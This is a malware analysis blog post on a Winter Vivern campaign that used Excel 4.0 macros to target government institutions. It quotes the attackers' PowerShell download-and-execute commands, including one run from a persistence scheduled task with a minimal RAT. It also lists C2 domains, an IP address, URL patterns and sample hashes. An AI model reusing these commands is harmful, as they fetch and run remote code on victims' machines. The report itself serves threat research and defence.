<p class="entry-meta"><time class="entry-time" itemprop="datePublished" datetime="2021-09-28T10:37:13+02:00">September 28, 2021</time></p></header><div class="entry-content" itemprop="text">
<p>In July, 2021, Lab52 found a currently active infection campaign (domain still up at the time of this writing) attributed to a group referred as Wintervivern after a <a href="https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs">report</a> published by the research team from DomainTools.</p>



<p>As the starting point for this research, we recently noticed that unless properly obfuscated, some functions in XLM macro could show their arguments in the strings of the excel file containing the macros.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img decoding="async" width="824" height="190" src="https://lab52.io/blog/wp-content/uploads/2021/09/image.png" alt="" class="wp-image-1124" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image.png 824w, https://lab52.io/blog/wp-content/uploads/2021/09/image-300x69.png 300w, https://lab52.io/blog/wp-content/uploads/2021/09/image-768x177.png 768w" sizes="(max-width: 824px) 100vw, 824px" /></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-large"><img decoding="async" width="519" height="97" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-1.png" alt="" class="wp-image-1125" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-1.png 519w, https://lab52.io/blog/wp-content/uploads/2021/09/image-1-300x56.png 300w" sizes="(max-width: 519px) 100vw, 519px" /></figure></div>



<p>We decided to take some advantage from this fact, and we tried to hunt for interesting excel files until we found a set of excel documents that revealed an active campaign against European governments, and without attribution so far.</p>



<p>We first caught a generic powershell line in a XLM macro, which caught our attention along with other keywords:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p><em>powershell.exe -c iex((new-object net.webclient).DownloadString(&#8216;https://server/run.txt&#8217;))</em></p></blockquote>



<p>Additionally, the yara ruleset created by John Lambert (@JohnLaTwC) indicated that the XML macro contained in this document was potentially created using SharpShooter (gen_Excel4Macro_Sharpshooter) which could be a useful fact in order to track the activity of the actors behind these documents.</p>



<p>As stated before, we also found in this same document other very interesting strings that would give an idea about the document&#8217;s content, along with some email addresses. Some of this strings were the following:</p>



<ul class="wp-block-list"><li><em>External Relations Committee</em></li><li><em>Working Party on Short-Term Economic Prospects</em></li><li><em>Governing Board of the Development Centre</em></li><li><em>Global Forum on Public Governance</em></li></ul>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="415" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-2-1024x415.png" alt="" class="wp-image-1129" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-2-1024x415.png 1024w, https://lab52.io/blog/wp-content/uploads/2021/09/image-2-300x122.png 300w, https://lab52.io/blog/wp-content/uploads/2021/09/image-2-768x311.png 768w, https://lab52.io/blog/wp-content/uploads/2021/09/image-2.png 1143w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Furthermore, this document contained embedded the following URL, many times:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p>hxxps://securetourspd.]com/syncService/sync.php?v=3ac2cc6263f84836a7cb38d04f1094b6907527c3e0265dd0dc480b0ba1204e51</p></blockquote>



<p>After a quick behavioral analysis of the document, we found out that the aforementioned command would serve the following new commands using a user-agent filter only serving requests coming from the MS Excel user-agent.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="872" height="739" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-3.png" alt="" class="wp-image-1130" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-3.png 872w, https://lab52.io/blog/wp-content/uploads/2021/09/image-3-300x254.png 300w, https://lab52.io/blog/wp-content/uploads/2021/09/image-3-768x651.png 768w" sizes="(max-width: 872px) 100vw, 872px" /></figure></div>



<p>This new set of commands would first download from the same domain a XML file and use it to establish a scheduled task for persistence, with name &#8220;Server_Update_Synchronization-{SDFGEYH-9D36-4HB1-8BWD-0EC1BD4FNM131}&#8221;, which would execute the following commands after Logon:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p>powershell.exe -w hidden -c &#8220;start-process &#8216;powershell.exe&#8217; -win hidden -argumentlist {<br><em>$g=New-Object Net.Webclient;</em><br><em>$g.credentials=[net.credentialcache]::DefaultNetworkCredentials;</em><br><em>iex g.DownloadString(&#8216;https://securetourspd.com/../users/2cd6c84c6c64ec05e7b418e15f9d1b7c0dc6733154aa266c64f0cb74e2083472/ceec36e6c881b957b52d30cc9848eb53fffb32d5.php&#8217;)}</em></p></blockquote>



<p>After establishing the persistence, it implements a function which happens to be a minimal RAT which is called every 10 seconds and receives a command from C2, executes it, and sends the result back to the C2.</p>



<p>The contacted domain was registered on July 1st pointing to 185.238.]169.57 associated to the ISP &#8220;IROKO Networks Corporation/Scalaxy B.V. Researching about this domain, we found that VirusTotal showed some interesting full URLs, being one of them, the one we already found in the starting document.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="258" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-4-1024x258.png" alt="" class="wp-image-1131" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-4-1024x258.png 1024w, https://lab52.io/blog/wp-content/uploads/2021/09/image-4-300x76.png 300w, https://lab52.io/blog/wp-content/uploads/2021/09/image-4-768x193.png 768w, https://lab52.io/blog/wp-content/uploads/2021/09/image-4.png 1215w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>It was also interesting the fact that the URL containing &#8220;mzv.sk/downloadFile&#8221; was actually indexed in Google:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="555" height="202" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-5.png" alt="" class="wp-image-1132" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-5.png 555w, https://lab52.io/blog/wp-content/uploads/2021/09/image-5-300x109.png 300w" sizes="(max-width: 555px) 100vw, 555px" /></figure></div>



<p>We could also reach some of those downloaded XLS files from the domain, and observed that these documents did not contain any functionality or suspicious strings.</p>



<p>However, after reviewing these documents and the URLs, we noticed that the documents and the domains contained as part of the path in the URL were directly related to different government institutions from different countries:</p>



<ul class="wp-block-list"><li>sds.va &#8211;&gt; Segreteria di Stato – Vaticano &#8211; Secretariat of State</li><li>lrp.lt &#8211;&gt; Lietuvos Respublikos Prezidentas – Lithuania &#8211; President of the Republic of Lithuania</li><li>mzv.sk &#8211;&gt; Ministerstvo zahraničných vecí &#8211; Slovakia &#8211; Ministry of Foreign Affairs</li></ul>



<p>At this point, now we could identify an interesting pattern in the different URLs found that allowed us to divide the C2 contacts in three different URLs for different functionalities.</p>



<ol class="wp-block-list"><li>https:// [C2 domain]/[target domain]/excel_files_service/downloadFile.php?v=[some victim ID]</li><li>https:// [C2 domain]/syncService/sync.php?v=[some victim ID]</li><li>https:// [C2 domain]/../users/[some victim ID]/[some file ID].php&#8217;</li><li>https:// [C2 domain]/xml_file.xml</li></ol>



<p>URL #1 would just download the XLS file with no macros, which could indicate that this could be used to serve clean files as a decoy.</p>



<p>URL #2 would be found in XLS files with XLM macros and it could be the first contact with the C2 after the infection. This would trigger the next stages of the infection since it would download and execute the previously documented commands and install the persistence as a scheduled task.</p>



<p>URL #3 would be found within the scheduled task and it would also download the same commands than URL #2 but without the lines to establish the scheduled task. Also, and most importantly, this URL structure would also be used for the C2 communication for command execution using a different [file ID] for command requests or sending command results.</p>



<p>URL #4 would download the xml file used for the scheduled task.</p>



<p>We tried to pull the thread of this URL structures but after some unsuccessful research we had to go back to the execution details, and we finally ended up finding something while searching by the name of the scheduled task.</p>



<p>With the help of Google dorking, we found a new XLS document with excel4 macros uploaded to the public sandbox of any.run:</p>



<ul class="wp-block-list"><li>Ενημερωμένος κατάλογος_NS.xls fdc4631008461df18e78fb653662f111</li></ul>



<p>On the other hand, using the same information we also found in VTi two .txt files named serverHttpRequest(RUN).txt which would be downloaded by different samples:</p>



<ul class="wp-block-list"><li>6661ea544a541357ada6c32eb70cd96c</li><li>7a59366676daaa95cc71a0110ef75753</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="872" height="428" src="https://lab52.io/blog/wp-content/uploads/2021/09/image-6.png" alt="" class="wp-image-1133" srcset="https://lab52.io/blog/wp-content/uploads/2021/09/image-6.png 872w, https://lab52.io/blog/wp-content/uploads/2021/09/image-6-300x147.png 300w, https://lab52.io/blog/wp-content/uploads/2021/09/image-6-768x377.png 768w" sizes="(max-width: 872px) 100vw, 872px" /></figure></div>



<p>The two .txt files resulted to be the same powershell content executed by the first download of the malicious XLS file with slight differences, and the xls file from any.run also resulted to follow the same techniques. In fact, it seems like the excel file would download one of those two files since it would contact the following URL, whose domain was also found in the .txt files:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p>hxxps://secure-daddy.]com/wintervivern/server/serverHttpRequest(RUN).txt&#8217;</p></blockquote>



<p>At this point, we could relate this new campaign with another recent campaign from a May 2021 named “Winter Vivern” due to the path from URL and described by the research team of <a href="https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs">DomainTools</a>.</p>



<p>One important thing to note, as DomainTools also stated, is the fact that all the information contained in the different XLS document seems to be public, which means that this documents were carefully crafted to target very specific entities.</p>



<p>Thanks to this new discovery, we obtained a new set of similar malicious XLS with the same excel4 macros, using different domains, which increased the list of targeted countries while still aiming to government institutions.</p>



<p>If we compare the full URLs used in both campaigns we could relate them as equivalent, resulting in:</p>



<ol class="wp-block-list"><li>No equivalent URL</li><li>https:// [C2 domain]/wintervivern/server/serverHttpRequest(RUN).txt&#8217;</li><li><ol type="a"><li>https:// [C2 domain /wintervivern/vivern/getAnswer.php?username=$uname&#8217;</li><li>https:// [C2 domain] /wintervivern/vivern/getcommand?username=$uname</li></ol></li><li><ol type="a"><li>https:// [C2 domain]/vivern/test_old.xml</li><li>https:// [C2 domain]/vivern/test.xml</li></ol></li></ol>



<p>The slight differences found in the analogy of URLs is actually revealing very interesting information about the evolution of this threat actor.</p>



<p>First, we did not find a path serving clean files that we assumed they could be used as a decoy. Secondly, we find a single common URL for all XLS files, instead of containing victim identifiers. Due to the lack of victim identifiers, we would find more generic URLs for the reception of commands and delivery of results, where only the username of the infected computer would be reported to the C2. Lastly, we find two different versions of the xml document served for the scheduled task, both containing “test” as a name. This could be intentional so as not to raise alarms on the victim, but it is clear that there has been a small evolution in some details of the TTPs of this actor, which is currently active.</p>
